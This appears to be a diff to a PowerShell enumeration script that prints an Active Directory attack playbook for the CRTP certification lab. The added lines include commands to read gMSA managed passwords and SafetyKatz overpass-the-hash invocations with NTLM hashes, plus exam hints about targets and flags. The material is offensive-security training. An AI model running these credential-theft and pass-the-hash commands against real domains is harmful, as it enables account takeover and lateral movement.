@@ -1389,7 +1389,8 @@ function Invoke-CRTPEnum {
                 $c += "     RUN :"
                 $c += "       `$g = Get-ADServiceAccount -Identity $($d.Account) -Properties 'msDS-ManagedPassword'"
                 $c += "       # decode the blob: ConvertFrom-ADManagedPasswordBlob  (or GMSAPasswordReader.exe)"
-                $c += "     NEXT: use the NTLM with Rubeus /rc4 (overpass-the-hash)."
+                $c += "     NEXT: OverPass-the-Hash with the NTLM (exam: prefer SafetyKatz):"
+                $c += "       SafetyKatz.exe `"sekurlsa::pth /user:$($d.Account) /domain:$Domain /ntlm:<NTLM> /run:powershell.exe`""
             }
             'MSSQL' {
                 $c += "`n[$ei] MSSQL ACCESSIBLE  ->  $($d.Instance)"
@@ -1458,6 +1459,17 @@ function Invoke-CRTPEnum {
     $pb += "LEGEND: <hash>=NTLM hash  <svc>=service account  <spn>=service SPN"
     $pb += "        <target>=victim host  <share>=UNC path you control  <vuln>=template"
     $pb += "Authorized CRTP lab / your own AD only."
+    $pb += ("=" * 76)
+
+    $pb += "`nEXAM NOTES (from the CRTP exam brief):"
+    $pb += "  * GOAL = OS command execution on ALL 5 target servers (admin NOT required),"
+    $pb += "    plus the final flag on the DC:  C:\Users\finadmin\Desktop\finalflag.txt"
+    $pb += "  * OverPass-the-Hash: use SafetyKatz (Rubeus OPtH was flaky in the exam)."
+    $pb += "  * No dictionary brute-force is required - there is always another path (use the ALTs)."
+    $pb += "  * BloodHound: run the collector in the lab, use the GUI on your host."
+    $pb += "  * Some PS tools need .NET 3.5 and can give inconsistent output - verify with a 2nd tool."
+    $pb += "  * REPORT: write it YOURSELF, explain WHY each command works. AI-generated report"
+    $pb += "    text is rejected. These files are a DOING aid / scaffold - not report content."
     $pb += ("=" * 76)
 
     $pb += "`n############################################################################"
@@ -1719,7 +1731,8 @@ function Invoke-CRTPEnum {
             'GMSA' {
                 $ch += "`n($cn) gMSA READABLE -> $t"
                 $ch += "    1) `$g = Get-ADServiceAccount -Identity $t -Properties 'msDS-ManagedPassword'  (decode blob)"
-                $ch += "    2) use the NTLM:  Rubeus.exe asktgt /user:$t /rc4:<NTLM> /ptt"
+                $ch += "    2) OverPass-the-Hash (exam: prefer SafetyKatz over Rubeus):"
+                $ch += "       SafetyKatz.exe `"sekurlsa::pth /user:$t /domain:$Domain /ntlm:<NTLM> /run:powershell.exe`""
                 $ch += "    => WIN: run as $t"
             }
             'GPP' {
